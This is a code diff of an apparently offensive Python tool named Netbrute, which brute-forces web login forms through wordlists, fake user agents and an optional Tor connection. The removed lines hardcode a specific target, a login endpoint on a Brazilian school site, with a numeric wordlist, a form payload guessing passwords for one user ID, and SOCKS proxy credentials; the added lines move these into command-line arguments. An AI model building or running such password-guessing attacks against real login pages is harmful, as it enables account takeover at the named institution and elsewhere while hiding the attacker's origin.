@@ -2,12 +2,14 @@
 import asyncio
 import async_timeout
 import aiohttp
-import aiosocks
 import json
-from copy import copy
+import sys
 
+from netbruter.arguments import argument_parsing
+from netbruter.tor import get_tor_connector
+from copy import copy
 from fake_useragent import UserAgent, FakeUserAgentError
-from aiosocks.connector import SocksConnector, HttpProxyAddr, HttpProxyAuth
+
 try:
     from asyncio import JoinableQueue as Queue
 except ImportError:
@@ -40,20 +42,20 @@ class Netbrute:
         return d
 
     @staticmethod
-    def _encode_payload_www(payload):
+    def _encode_payload_www(unencoded_payload):
         """
         Function responsible for transforming a dictionary payload into x-www-form-urlencoded payload
-        :param payload:
+        :param unencoded_payload:
         :return:
         """
         pl = str()
-        dict_len = len(payload)
+        dict_len = len(unencoded_payload)
         i = 1
-        for key in payload:
+        for key in unencoded_payload:
             if i != dict_len:
-                pl += "{0}={1}&".format(key, payload[key])
+                pl += "{0}={1}&".format(key, unencoded_payload[key])
             else:
-                pl += "{0}={1}".format(key, payload[key])
+                pl += "{0}={1}".format(key, unencoded_payload[key])
             i += 1
         return pl
 
@@ -118,14 +120,15 @@ if __name__ == "__main__":
         pass
 
     loop = asyncio.get_event_loop()
+    args = argument_parsing()
+    if not args:
+        sys.exit(0)
 
-    wordlist = "num8.txt"
-    payload = "login:179 , senha:PASS,enviar:OK "
-    url = "http://cepein.femanet.com.br/areprofessor/login/proc_loginAlPro.jsp"
-    error_string = "incorreta"
-    addr = aiosocks.Socks5Addr('127.0.0.1', 9050)
-    auth = aiosocks.Socks5Auth('proxyuser99', password='pwd11111')
-    conn = SocksConnector(proxy=addr, proxy_auth=auth, remote_resolve=True)
-    session = aiohttp.ClientSession(loop=loop, connector=conn)
-    net = Netbrute(session, url, payload, wordlist, error_string)
+    if args.tor:
+        conn = get_tor_connector()
+        session = aiohttp.ClientSession(loop=loop, connector=conn)
+    else:
+        session = aiohttp.ClientSession(loop=loop)
+
+    net = Netbrute(session, args.url, args.payload, args.wordlist, args.error_string)
     loop.run_until_complete(net.initiate())
